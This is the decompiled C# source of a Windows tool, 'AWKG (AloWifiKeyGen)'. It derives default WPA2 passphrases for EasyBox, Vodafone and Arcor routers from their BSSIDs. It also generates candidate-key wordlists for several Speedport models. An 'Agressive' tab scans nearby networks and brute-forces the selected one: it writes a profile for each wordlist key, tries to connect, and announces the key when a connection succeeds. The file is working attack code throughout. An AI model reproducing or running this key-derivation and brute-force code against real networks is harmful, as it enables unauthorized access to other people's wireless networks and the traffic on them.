// Decompiled with JetBrains decompiler
// Type: AloSpeedportKeyGen.Form1
// Assembly: AloSpeedportKeyGen, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3589E960-AABA-43FA-9244-B9F2FC9AD634
// Assembly location: C:\Users\snofl\Downloads\AloSpeedportKeyGen.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

//#nullable disable
namespace AloSpeedportKeyGen
{
  public class Form1 : Form
  {
    private IContainer components = (IContainer) null;
    private TextBox textBox2;
    private Label label1;
    private Label label2;
    private Label label3;
    private Button button1;
    private TextBox textBox3;
    private Label label4;
    private CheckBox checkBox1;
    private Label label5;
    private Label label6;
    private TabControl tabControl1;
    private TabPage tabPage1;
    private TabPage tabPage2;
    private Button ScanBttn;
    private ListBox listBox1;
    private Label label7;
    private CheckedListBox checkedListBox1;
    private TextBox textBox4;
    private Label label8;
    private ListBox listBox2;
    private Button button2;
    private Label label9;
    private TextBox textBox1;
    private Label label10;
    private ProgressBar progressBar1;
    private Label label12;
    private Label label11;
    private TrackBar trackBar1;
    private Button button3;
    private Label label17;
    private Label label16;
    private Label label15;
    private Label label14;
    private Label label13;
    private Label label18;
    private bool stop = false;
    private bool threadstop = false;

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.textBox2 = new TextBox();
      this.label1 = new Label();
      this.label2 = new Label();
      this.label3 = new Label();
      this.button1 = new Button();
      this.textBox3 = new TextBox();
      this.label4 = new Label();
      this.checkBox1 = new CheckBox();
      this.label5 = new Label();
      this.label6 = new Label();
      this.tabControl1 = new TabControl();
      this.tabPage1 = new TabPage();
      this.label18 = new Label();
      this.textBox4 = new TextBox();
      this.tabPage2 = new TabPage();
      this.label17 = new Label();
      this.label16 = new Label();
      this.label15 = new Label();
      this.label14 = new Label();
      this.label13 = new Label();
      this.button3 = new Button();
      this.label12 = new Label();
      this.label11 = new Label();
      this.trackBar1 = new TrackBar();
      this.label10 = new Label();
      this.progressBar1 = new ProgressBar();
      this.label9 = new Label();
      this.textBox1 = new TextBox();
      this.label8 = new Label();
      this.listBox2 = new ListBox();
      this.button2 = new Button();
      this.label7 = new Label();
      this.checkedListBox1 = new CheckedListBox();
      this.ScanBttn = new Button();
      this.listBox1 = new ListBox();
      this.tabControl1.SuspendLayout();
      this.tabPage1.SuspendLayout();
      this.tabPage2.SuspendLayout();
      this.trackBar1.BeginInit();
      this.SuspendLayout();
      this.textBox2.Location = new Point(373, 260);
      this.textBox2.Name = "textBox2";
      this.textBox2.Size = new Size(177, 20);
      this.textBox2.TabIndex = 1;
      this.textBox2.Text = "00:1A:2B:44:12:8B";
      this.textBox2.TextChanged += new EventHandler(this.textBox2_TextChanged);
      this.label1.AutoSize = true;
      this.label1.Location = new Point(325, 237);
      this.label1.Name = "label1";
      this.label1.Size = new Size(42, 13);
      this.label1.TabIndex = 2;
      this.label1.Text = "ESSID:";
      this.label2.AutoSize = true;
      this.label2.Location = new Point(325, 263);
      this.label2.Name = "label2";
      this.label2.Size = new Size(42, 13);
      this.label2.TabIndex = 3;
      this.label2.Text = "BSSID:";
      this.label3.AutoSize = true;
      this.label3.Location = new Point(317, 62);
      this.label3.Name = "label3";
      this.label3.Size = new Size(261, 13);
      this.label3.TabIndex = 4;
      this.label3.Text = "This tool generates wordlists for default WPA/2 PSKs ";
      this.button1.Location = new Point(399, 424);
      this.button1.Name = "button1";
      this.button1.Size = new Size(100, 21);
      this.button1.TabIndex = 5;
      this.button1.Text = "GENERATE";
      this.button1.UseVisualStyleBackColor = true;
      this.button1.Click += new EventHandler(this.button1_Click);
      this.textBox3.Location = new Point(373, 286);
      this.textBox3.Name = "textBox3";
      this.textBox3.Size = new Size(177, 20);
      this.textBox3.TabIndex = 6;
      this.textBox3.Text = "C:\\Users\\Alo\\Desktop\\list.txt";
      this.textBox3.TextChanged += new EventHandler(this.textBox3_TextChanged);
      this.label4.AutoSize = true;
      this.label4.Location = new Point(231, 289);
      this.label4.Name = "label4";
      this.label4.Size = new Size(136, 13);
      this.label4.TabIndex = 7;
      this.label4.Text = "Where to save the wordlist:";
      this.checkBox1.AutoSize = true;
      this.checkBox1.Location = new Point(234, 364);
      this.checkBox1.Name = "checkBox1";
      this.checkBox1.Size = new Size(207, 17);
      this.checkBox1.TabIndex = 8;
      this.checkBox1.Text = "Add default PSKs for older Speedports";
      this.checkBox1.UseVisualStyleBackColor = true;
      this.checkBox1.CheckedChanged += new EventHandler(this.checkBox1_CheckedChanged);
      this.label5.AutoSize = true;
      this.label5.ForeColor = SystemColors.MenuHighlight;
      this.label5.Location = new Point(274, 105);
      this.label5.Name = "label5";
      this.label5.Size = new Size(358, 13);
      this.label5.TabIndex = 9;
      this.label5.Text = "Only supports Speedport W500, W502v, W700v, W 723V Typ B, W 921V";
      this.label6.AutoSize = true;
      this.label6.ForeColor = SystemColors.MenuHighlight;
      this.label6.Location = new Point(316, 118);
      this.label6.Name = "label6";
      this.label6.Size = new Size(262, 13);
      this.label6.TabIndex = 10;
      this.label6.Text = "-AND- EasyBox-xxxxxx, Vodafone-xxxxxx, Arcor-xxxxxx";
      this.tabControl1.Controls.Add((Control) this.tabPage1);
      this.tabControl1.Controls.Add((Control) this.tabPage2);
      this.tabControl1.Location = new Point(12, 10);
      this.tabControl1.Name = "tabControl1";
      this.tabControl1.SelectedIndex = 0;
      this.tabControl1.Size = new Size(983, 532);
      this.tabControl1.TabIndex = 11;
      this.tabPage1.Controls.Add((Control) this.label18);
      this.tabPage1.Controls.Add((Control) this.textBox4);
      this.tabPage1.Controls.Add((Control) this.button1);
      this.tabPage1.Controls.Add((Control) this.label3);
      this.tabPage1.Controls.Add((Control) this.label5);
      this.tabPage1.Controls.Add((Control) this.label6);
      this.tabPage1.Controls.Add((Control) this.checkBox1);
      this.tabPage1.Controls.Add((Control) this.textBox3);
      this.tabPage1.Controls.Add((Control) this.label4);
      this.tabPage1.Controls.Add((Control) this.label1);
      this.tabPage1.Controls.Add((Control) this.label2);
      this.tabPage1.Controls.Add((Control) this.textBox2);
      this.tabPage1.Location = new Point(4, 22);
      this.tabPage1.Name = "tabPage1";
      this.tabPage1.Padding = new Padding(3);
      this.tabPage1.Size = new Size(975, 506);
      this.tabPage1.TabIndex = 0;
      this.tabPage1.Text = "Passive";
      this.tabPage1.UseVisualStyleBackColor = true;
      this.label18.AutoSize = true;
      this.label18.Location = new Point(316, 179);
      this.label18.Name = "label18";
      this.label18.Size = new Size(259, 13);
      this.label18.TabIndex = 12;
      this.label18.Text = "You can automatically fill the form in the agressive tab";
      this.textBox4.Location = new Point(373, 237);
      this.textBox4.Name = "textBox4";
      this.textBox4.Size = new Size(177, 20);
      this.textBox4.TabIndex = 11;
      this.textBox4.Text = "WLAN-441207";
      this.textBox4.TextChanged += new EventHandler(this.textBox4_TextChanged);
      this.tabPage2.AutoScroll = true;
      this.tabPage2.Controls.Add((Control) this.label17);
      this.tabPage2.Controls.Add((Control) this.label16);
      this.tabPage2.Controls.Add((Control) this.label15);
      this.tabPage2.Controls.Add((Control) this.label14);
      this.tabPage2.Controls.Add((Control) this.label13);
      this.tabPage2.Controls.Add((Control) this.button3);
      this.tabPage2.Controls.Add((Control) this.label12);
      this.tabPage2.Controls.Add((Control) this.label11);
      this.tabPage2.Controls.Add((Control) this.trackBar1);
      this.tabPage2.Controls.Add((Control) this.label10);
      this.tabPage2.Controls.Add((Control) this.progressBar1);
      this.tabPage2.Controls.Add((Control) this.label9);
      this.tabPage2.Controls.Add((Control) this.textBox1);
      this.tabPage2.Controls.Add((Control) this.label8);
      this.tabPage2.Controls.Add((Control) this.listBox2);
      this.tabPage2.Controls.Add((Control) this.button2);
      this.tabPage2.Controls.Add((Control) this.label7);
      this.tabPage2.Controls.Add((Control) this.checkedListBox1);
      this.tabPage2.Controls.Add((Control) this.ScanBttn);
      this.tabPage2.Controls.Add((Control) this.listBox1);
      this.tabPage2.Location = new Point(4, 22);
      this.tabPage2.Name = "tabPage2";
      this.tabPage2.Padding = new Padding(3);
      this.tabPage2.Size = new Size(975, 506);
      this.tabPage2.TabIndex = 1;
      this.tabPage2.Text = "Agressive";
      this.tabPage2.UseVisualStyleBackColor = true;
      this.label17.AutoSize = true;
      this.label17.Location = new Point(387, 99);
      this.label17.Name = "label17";
      this.label17.Size = new Size(495, 13);
      this.label17.TabIndex = 19;
      this.label17.Text = "5. Choose an Wordlist, the interrupt(time between connection attempts - default is 8) and press ATTACK";
      this.label16.AutoSize = true;
      this.label16.Location = new Point(387, 55);
      this.label16.Name = "label16";
      this.label16.Size = new Size(99, 13);
      this.label16.TabIndex = 18;
      this.label16.Text = "3. Select an WLAN";
      this.label15.AutoSize = true;
      this.label15.Location = new Point(387, 77);
      this.label15.Name = "label15";
      this.label15.Size = new Size(580, 13);
      this.label15.TabIndex = 17;
      this.label15.Text = "4. If you need to generate wordlist for Sppedport Routers first then press the copy button and genaerate in the passive tab";
      this.label14.AutoSize = true;
      this.label14.Location = new Point(387, 33);
      this.label14.Name = "label14";
      this.label14.Size = new Size(99, 13);
      this.label14.TabIndex = 16;
      this.label14.Text = "2. Scan for WLANs";
      this.label13.AutoSize = true;
      this.label13.Location = new Point(387, 13);
      this.label13.Name = "label13";
      this.label13.Size = new Size(93, 13);
      this.label13.TabIndex = 15;
      this.label13.Text = "1. Select interface";
      this.button3.Location = new Point(9, 457);
      this.button3.Name = "button3";
      this.button3.Size = new Size(172, 23);
      this.button3.TabIndex = 14;
      this.button3.Text = "copy selected wlan to generator";
      this.button3.UseVisualStyleBackColor = true;
      this.button3.Click += new EventHandler(this.button3_Click);
      this.label12.AutoSize = true;
      this.label12.Location = new Point(559, 435);
      this.label12.Name = "label12";
      this.label12.Size = new Size(33, 13);
      this.label12.TabIndex = 13;
      this.label12.Text = "8 sec";
      this.label11.AutoSize = true;
      this.label11.Location = new Point(504, 435);
      this.label11.Name = "label11";
      this.label11.Size = new Size(49, 13);
      this.label11.TabIndex = 12;
      this.label11.Text = "Interrupt:";
      this.trackBar1.Location = new Point(592, 435);
      this.trackBar1.Maximum = 20;
      this.trackBar1.Minimum = 2;
      this.trackBar1.Name = "trackBar1";
      this.trackBar1.Size = new Size(119, 45);
      this.trackBar1.TabIndex = 11;
      this.trackBar1.Value = 8;
      this.trackBar1.Scroll += new EventHandler(this.trackBar1_Scroll);
      this.label10.AutoSize = true;
      this.label10.Location = new Point(504, 402);
      this.label10.Name = "label10";
      this.label10.Size = new Size(0, 13);
      this.label10.TabIndex = 10;
      this.progressBar1.Location = new Point(507, 376);
      this.progressBar1.Name = "progressBar1";
      this.progressBar1.Size = new Size(397, 23);
      this.progressBar1.TabIndex = 9;
      this.label9.AutoSize = true;
      this.label9.Location = new Point(504, 353);
      this.label9.Name = "label9";
      this.label9.Size = new Size(82, 13);
      this.label9.TabIndex = 8;
      this.label9.Text = "Path to wordlist:";
      this.textBox1.Location = new Point(592, 350);
      this.textBox1.Name = "textBox1";
      this.textBox1.Size = new Size(259, 20);
      this.textBox1.TabIndex = 7;
      this.textBox1.Text = "C:\\Users\\Alo\\Desktop\\list.txt";
      this.label8.AutoSize = true;
      this.label8.Location = new Point(461, 171);
      this.label8.Name = "label8";
      this.label8.Size = new Size(40, 13);
      this.label8.TabIndex = 6;
      this.label8.Text = "output:";
      this.listBox2.FormattingEnabled = true;
      this.listBox2.Location = new Point(507, 171);
      this.listBox2.Name = "listBox2";
      this.listBox2.Size = new Size(411, 160);
      this.listBox2.TabIndex = 5;
      this.button2.Location = new Point(794, 435);
      this.button2.Name = "button2";
      this.button2.Size = new Size(124, 45);
      this.button2.TabIndex = 4;
      this.button2.Text = "Attack selected";
      this.button2.UseVisualStyleBackColor = true;
      this.button2.Click += new EventHandler(this.button2_Click);
      this.label7.AutoSize = true;
      this.label7.Location = new Point(6, 13);
      this.label7.Name = "label7";
      this.label7.Size = new Size(84, 13);
      this.label7.TabIndex = 3;
      this.label7.Text = "Select interface:";
      this.checkedListBox1.FormattingEnabled = true;
      this.checkedListBox1.Location = new Point(9, 33);
      this.checkedListBox1.Name = "checkedListBox1";
      this.checkedListBox1.Size = new Size(286, 79);
      this.checkedListBox1.TabIndex = 2;
      this.ScanBttn.Location = new Point(9, 118);
      this.ScanBttn.Name = "ScanBttn";
      this.ScanBttn.Size = new Size(96, 24);
      this.ScanBttn.TabIndex = 1;
      this.ScanBttn.Text = "scan";
      this.ScanBttn.UseVisualStyleBackColor = true;
      this.ScanBttn.Click += new EventHandler(this.ScanBttn_Click);
      this.listBox1.FormattingEnabled = true;
      this.listBox1.Location = new Point(9, 171);
      this.listBox1.Name = "listBox1";
      this.listBox1.Size = new Size(286, 251);
      this.listBox1.TabIndex = 0;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.AutoScroll = true;
      this.AutoSize = true;
      this.ClientSize = new Size(1007, 554);
      this.Controls.Add((Control) this.tabControl1);
      this.Name = nameof (Form1);
      this.Text = "AWKG (AloWifiKeyGen)";
      this.tabControl1.ResumeLayout(false);
      this.tabPage1.ResumeLayout(false);
      this.tabPage1.PerformLayout();
      this.tabPage2.ResumeLayout(false);
      this.tabPage2.PerformLayout();
      this.trackBar1.EndInit();
      this.ResumeLayout(false);
    }

    public Form1()
    {
      this.InitializeComponent();
      foreach (WlanClient.WlanInterface wlanInterface in new WlanClient().Interfaces)
        this.checkedListBox1.Items.Add((object) wlanInterface.InterfaceDescription);
    }

    private void button1_Click(object sender, EventArgs e)
    {
      string text1 = this.textBox4.Text;
      string aBSSID = this.filterBSSID(this.textBox2.Text);
      string text2 = this.textBox3.Text;
      if (this.textBox4.Text.Contains("EasyBox-") || this.textBox4.Text.Contains("Arcor-") || this.textBox4.Text.Contains("Vodafone-"))
      {
        string str = Form1.generate4EasyBox(aBSSID);
        int num = (int) MessageBox.Show("Default PSK is: " + str + " and written to " + text2, "SUCCESS");
        this.writeList(new List<string>()
        {
          "ESSID:" + text1,
          "BSSID:" + aBSSID,
          "PSK:" + str
        }, text2);
        this.button1.Text = "done";
      }
      else
      {
        this.button1.Text = "working...";
        this.button1.Update();
        List<string> stringList = new List<string>();
        this.generateExtendedKeys(text1, aBSSID, stringList);
        if (this.checkBox1.Checked)
          stringList.AddRange((IEnumerable<string>) this.generateNormalKeys(text1, aBSSID));
        this.writeList(stringList, text2);
        this.button1.Text = "done";
      }
    }

    private string asciiConverter(string aHex)
    {
      switch (aHex)
      {
        case "0":
          return "48";
        case "1":
          return "49";
        case "2":
          return "50";
        case "3":
          return "51";
        case "4":
          return "52";
        case "5":
          return "53";
        case "6":
          return "54";
        case "7":
          return "55";
        case "8":
          return "56";
        case "9":
          return "57";
        case "A":
          return "65";
        case "B":
          return "66";
        case "C":
          return "67";
        case "D":
          return "68";
        case "E":
          return "69";
        case "F":
          return "70";
        default:
          throw new ArgumentException("non convertable");
      }
    }

    private void generateExtendedKeys(string aESSID, string aBSSID, List<string> aKeyList)
    {
      string str1 = "";
      char[] charArray1 = aESSID.ToCharArray();
      char[] charArray2 = aBSSID.ToCharArray();
      List<string> stringList = new List<string>()
      {
        "48",
        "49",
        "50",
        "51",
        "52",
        "53",
        "54",
        "55",
        "56",
        "57",
        "65",
        "66",
        "67",
        "68",
        "69",
        "70"
      };
      char[] charArray3 = (str1 + (object) charArray1[9] + "@" + (object) charArray1[10] + this.asciiConverter(charArray2[9].ToString()) + this.asciiConverter(charArray2[10].ToString()) + this.asciiConverter(charArray2[11].ToString()) + "@" + "@" + "@" + this.asciiConverter(charArray1[6].ToString()) + this.asciiConverter(charArray1[7].ToString())).ToCharArray();
      for (int index1 = 0; index1 <= 9; ++index1)
      {
        charArray3[1] = char.Parse(index1.ToString());
        for (int index2 = 0; index2 <= 9; ++index2)
        {
          charArray3[9] = char.Parse(index2.ToString());
          for (int index3 = 0; index3 <= 9; ++index3)
          {
            charArray3[10] = char.Parse(index3.ToString());
            charArray3[11] = char.Parse(index1.ToString());
            string str2 = "";
            for (int index4 = 0; index4 < charArray3.Length; ++index4)
              str2 += (string) (object) charArray3[index4];
            aKeyList.Add(str2);
          }
        }
      }
    }

    private void writeList(List<string> aKeylist, string aPath)
    {
      StreamWriter text = File.CreateText(aPath);
      foreach (string str in aKeylist)
        text.WriteLine(str);
      text.Close();
    }

    private string filterBSSID(string aBssid)
    {
      aBssid = aBssid.ToUpper();
      return aBssid.Replace(":", "");
    }

    private List<string> generateNormalKeys(string aESSID, string aBSSID)
    {
      string str1 = "";
      char[] charArray1 = aESSID.ToCharArray();
      char[] charArray2 = aBSSID.ToCharArray();
      List<string> normalKeys = new List<string>();
      char[] charArray3 = (str1 + "SP-" + (object) charArray1[9] + "@" + (object) charArray1[10] + (object) charArray2[9] + (object) charArray2[10] + (object) charArray2[11] + "*" + "#" + "+").ToCharArray();
      for (int index1 = 0; index1 <= 9; ++index1)
      {
        charArray3[4] = char.Parse(index1.ToString());
        for (int index2 = 0; index2 <= 9; ++index2)
        {
          charArray3[9] = char.Parse(index2.ToString());
          for (int index3 = 0; index3 <= 9; ++index3)
          {
            charArray3[10] = char.Parse(index3.ToString());
            charArray3[11] = char.Parse(index1.ToString());
            string str2 = "";
            for (int index4 = 0; index4 < charArray3.Length; ++index4)
              str2 += (string) (object) charArray3[index4];
            normalKeys.Add(str2);
          }
        }
      }
      return normalKeys;
    }

    private static int DeHex(char hex) => int.Parse(hex.ToString(), NumberStyles.HexNumber);

    private void textBox4_TextChanged(object sender, EventArgs e) => this.button1.Text = "GENERATE";

    private void textBox2_TextChanged(object sender, EventArgs e) => this.button1.Text = "GENERATE";

    private void textBox3_TextChanged(object sender, EventArgs e) => this.button1.Text = "GENERATE";

    private void checkBox1_CheckedChanged(object sender, EventArgs e)
    {
      this.button1.Text = "GENERATE";
    }

    public static string generate4EasyBox(string aBSSID)
    {
      string str1 = "";
      aBSSID = aBSSID.Trim();
      if (aBSSID.Length == 12)
      {
        string str2 = string.Concat((object) int.Parse(aBSSID.Substring(8, 4), NumberStyles.HexNumber));
        while (str2.Length < 5)
          str2 = "0" + str2;
        char ch1 = str2[0];
        char ch2 = str2[1];
        char ch3 = str2[2];
        char ch4 = str2[3];
        char ch5 = str2[4];
        char ch6 = aBSSID[6];
        char ch7 = aBSSID[7];
        char ch8 = aBSSID[8];
        char ch9 = aBSSID[9];
        char ch10 = aBSSID[10];
        char ch11 = aBSSID[11];
        string str3 = string.Format("{0:x}", (object) (Convert.ToInt32(ch2.ToString(), 16) + Convert.ToInt32(ch3.ToString(), 16) + Convert.ToInt32(ch10.ToString(), 16) + Convert.ToInt32(ch11.ToString(), 16)));
        string str4 = string.Format("{0:x}", (object) (Convert.ToInt32(ch8.ToString(), 16) + Convert.ToInt32(ch9.ToString(), 16) + Convert.ToInt32(ch4.ToString(), 16) + Convert.ToInt32(ch5.ToString(), 16)));
        char ch12 = str3[str3.Length - 1];
        char ch13 = str4[str4.Length - 1];
        string str5 = string.Format("{0:x}", (object) (Convert.ToInt32(ch12.ToString(), 16) ^ Convert.ToInt32(ch5.ToString(), 16)));
        string str6 = string.Format("{0:x}", (object) (Convert.ToInt32(ch12.ToString(), 16) ^ Convert.ToInt32(ch4.ToString(), 16)));
        string str7 = string.Format("{0:x}", (object) (Convert.ToInt32(ch12.ToString(), 16) ^ Convert.ToInt32(ch3.ToString(), 16)));
        string str8 = string.Format("{0:x}", (object) (Convert.ToInt32(ch13.ToString(), 16) ^ Convert.ToInt32(ch9.ToString(), 16)));
        string str9 = string.Format("{0:x}", (object) (Convert.ToInt32(ch13.ToString(), 16) ^ Convert.ToInt32(ch10.ToString(), 16)));
        string str10 = string.Format("{0:x}", (object) (Convert.ToInt32(ch13.ToString(), 16) ^ Convert.ToInt32(ch11.ToString(), 16)));
        string str11 = string.Format("{0:x}", (object) (Convert.ToInt32(ch10.ToString(), 16) ^ Convert.ToInt32(ch5.ToString(), 16)));
        string str12 = string.Format("{0:x}", (object) (Convert.ToInt32(ch11.ToString(), 16) ^ Convert.ToInt32(ch4.ToString(), 16)));
        string str13 = string.Format("{0:x}", (object) (Convert.ToInt32(ch12.ToString(), 16) ^ Convert.ToInt32(ch13.ToString(), 16)));
        str1 = str5 + str8 + str11 + str6 + str9 + str12 + str7 + str10 + str13;
      }
      else
      {
        int num = (int) MessageBox.Show("Error: MAC – Address must have 12 digits!");
      }
      return str1.ToUpper();
    }

    private string GetStringForSSID(Wlan.Dot11Ssid ssid)
    {
      return Encoding.ASCII.GetString(ssid.SSID, 0, (int) ssid.SSIDLength);
    }

    private void ScanBttn_Click(object sender, EventArgs e)
    {
      this.listBox1.Items.Clear();
      WlanClient wlanClient = new WlanClient();
      List<WlanClient.WlanInterface> wlanInterfaceList = new List<WlanClient.WlanInterface>();
      foreach (WlanClient.WlanInterface wlanInterface in wlanClient.Interfaces)
      {
        int index = this.checkedListBox1.Items.IndexOf((object) wlanInterface.InterfaceDescription.ToString());
        if (this.checkedListBox1.Items[index].ToString().Equals(wlanInterface.InterfaceDescription) && this.checkedListBox1.GetItemChecked(index))
          wlanInterfaceList.Add(wlanInterface);
      }
      foreach (WlanClient.WlanInterface wlanInterface in wlanInterfaceList)
      {
        Wlan.WlanAvailableNetwork[] availableNetworkList1 = wlanInterface.GetAvailableNetworkList((Wlan.WlanGetAvailableNetworkFlags) 0);
        List<Wlan.WlanAvailableNetwork> availableNetworkList2 = new List<Wlan.WlanAvailableNetwork>();
        Wlan.WlanAvailableNetwork availableNetwork1;
        foreach (Wlan.WlanAvailableNetwork availableNetwork2 in availableNetworkList1)
        {
          availableNetwork1 = availableNetwork2;
          if (!availableNetwork1.profileName.Equals(""))
            availableNetworkList2.Add(availableNetwork1);
        }
        foreach (Wlan.WlanAvailableNetwork availableNetwork3 in availableNetworkList1)
        {
          availableNetwork1 = availableNetwork3;
          if (!this.listBox1.Items.Contains((object) this.GetStringForSSID(availableNetwork1.dot11Ssid)))
            this.listBox1.Items.Add((object) this.GetStringForSSID(availableNetwork1.dot11Ssid));
        }
        this.ScanBttn.Text = "Rescan";
      }
    }

    private void button2_Click(object sender, EventArgs e)
    {
      if (this.button2.Text.Equals("stop attack"))
      {
        this.stop = true;
        this.threadstop = true;
      }
      if (!this.stop)
        this.threadstop = false;
      this.button2.Text = "stop attack";
      string[] source = File.ReadAllLines(this.textBox1.Text);
      this.progressBar1.Value = 0;
      this.progressBar1.Minimum = 0;
      this.progressBar1.Maximum = source.Length;
      this.progressBar1.Step = 1;
      int num1 = ((IEnumerable<string>) source).Count<string>();
      int time4step = this.trackBar1.Value;
      float num2 = (float) (num1 * time4step);
      List<string> stringList = new List<string>()
      {
        "razdfhfdhdhfhd",
        "arezhzhaerzaerz",
        "aredhdhzahfhd",
        "shsdhdhuseus",
        "gjhstjgjfgjgjsss",
        "srjksjstujstjjsfgj",
        "SP-057940365",
        "4344853680534966",
        "baumhaus2012"
      };
      foreach (string str1 in source)
      {
        if (this.stop)
        {
          this.stop = false;
          this.button2.Text = "attack selected";
          return;
        }
        foreach (WlanClient.WlanInterface wlanIface in new WlanClient().Interfaces)
        {
          if (this.stop || this.threadstop)
            return;
          if (wlanIface.InterfaceDescription.Equals(this.checkedListBox1.SelectedItem.ToString()))
          {
            if (this.stop || this.threadstop)
              return;
            Wlan.WlanAvailableNetwork[] availableNetworkList = wlanIface.GetAvailableNetworkList((Wlan.WlanGetAvailableNetworkFlags) 0);
            List<Wlan.WlanProfileInfo> wlanProfileInfoList = new List<Wlan.WlanProfileInfo>();
            foreach (Wlan.WlanProfileInfo profile in wlanIface.GetProfiles())
            {
              if (this.stop || this.threadstop)
                return;
              wlanProfileInfoList.Add(profile);
            }
            string str2 = "";
            string str3 = this.listBox1.SelectedItem.ToString();
            foreach (Wlan.WlanAvailableNetwork availableNetwork in availableNetworkList)
            {
              if (this.stop || this.threadstop)
                return;
              if (this.GetStringForSSID(availableNetwork.dot11Ssid).Equals(str3))
              {
                for (int index = 0; (long) index < (long) availableNetwork.dot11Ssid.SSIDLength; ++index)
                {
                  if (this.stop || this.threadstop)
                    return;
                  str2 += availableNetwork.dot11Ssid.SSID[index].ToString();
                }
              }
            }
            string str4 = "WPA2PSK";
            string str5 = "AES";
            string str6 = str1;
            string profileXml = "<?xml version=\"1.0\" encoding=\"US-ASCII\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>" + str3 + "</name><SSIDConfig><SSID><name>" + str3 + "</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>auto</connectionMode><autoSwitch>false</autoSwitch><MSM><security><authEncryption><authentication>" + str4 + "</authentication><encryption>" + str5 + "</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>" + str6 + "</keyMaterial></sharedKey></security></MSM></WLANProfile>";
            try
            {
              int num3 = (int) wlanIface.SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, true);
              wlanIface.Connect(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, str3);
              this.listBox2.Items.Add((object) ("Connection attempt with Password: " + str6 + "  on: " + str3));
              this.listBox2.Update();
              if (!this.threadstop)
                this.doTheConnecShit(wlanIface, time4step);
              if (wlanIface.InterfaceState.ToString().Equals("Connected"))
              {
                this.listBox2.Items.Add((object) ("SUCCESS!!! " + (object) wlanIface.InterfaceState + "  at: " + str3));
                Console.Beep(500, 200);
                Console.Beep(600, 200);
                Console.Beep(700, 200);
                Console.Beep(800, 400);
                Console.Beep(700, 400);
                Console.Beep(800, 1000);
                int num4 = (int) MessageBox.Show("Key for " + str3 + " is: " + str6, "SUCCESS");
                return;
              }
              this.listBox2.Items.Clear();
              this.listBox2.Items.Add((object) ("failed - next try at: " + str3));
              wlanIface.DeleteProfile(str3);
              this.progressBar1.PerformStep();
              this.progressBar1.Update();
              num2 -= (float) time4step;
              this.label10.Text = "Estimated time in minutes: " + (object) (float) ((double) num2 / 60.0);
              this.label10.Update();
            }
            catch (Exception ex)
            {
              this.listBox2.Items.Add((object) ex.Message);
            }
          }
        }
      }
      this.listBox2.Items.Add((object) "FINISHED!!!");
      this.button2.Text = "attack";
      this.stop = false;
    }

    private void doTheConnecShit(WlanClient.WlanInterface wlanIface, int time4step)
    {
      string str = wlanIface.InterfaceState.ToString();
      TimeSpan timeSpan1 = new TimeSpan((long) (time4step * 10000000));
      DateTime now = DateTime.Now;
      TimeSpan timeSpan2 = new TimeSpan(200000L);
label_11:
      if (this.threadstop)
        return;
      Application.DoEvents();
      TimeSpan timeout = now.Add(timeSpan1).Subtract(DateTime.Now);
      if (timeout > timeSpan2)
      {
        Thread.Sleep(time4step / 2);
        for (; !str.Equals("Connected") && !str.Equals("Disconnected"); str = wlanIface.InterfaceState.ToString())
        {
          if (this.threadstop)
            return;
          Thread.Sleep(time4step / 2);
        }
        goto label_11;
      }
      else
      {
        if (this.threadstop || timeout.Ticks <= 0L)
          return;
        Thread.Sleep(timeout);
      }
    }

    private void trackBar1_Scroll(object sender, EventArgs e)
    {
      this.label12.Text = this.trackBar1.Value.ToString() + "  sec";
    }

    private void button3_Click(object sender, EventArgs e)
    {
      foreach (WlanClient.WlanInterface wlanInterface in new WlanClient().Interfaces)
      {
        foreach (Wlan.WlanBssEntry networkBss in wlanInterface.GetNetworkBssList())
        {
          byte[] dot11Bssid = networkBss.dot11Bssid;
          uint length = (uint) dot11Bssid.Length;
          string[] strArray = new string[(int) length];
          string str1 = "";
          for (int index = 0; (long) index < (long) length; ++index)
          {
            strArray[index] = dot11Bssid[index].ToString("x2");
            str1 = str1 + dot11Bssid[index].ToString("x2") + ":";
          }
          Console.WriteLine(str1);
          string str2 = str1.Remove(str1.Length - 1);
          if (this.GetStringForSSID(networkBss.dot11Ssid).Equals(this.listBox1.SelectedItem.ToString()))
          {
            this.textBox4.Text = this.listBox1.SelectedItem.ToString();
            this.textBox2.Text = str2;
          }
        }
      }
    }
  }
}
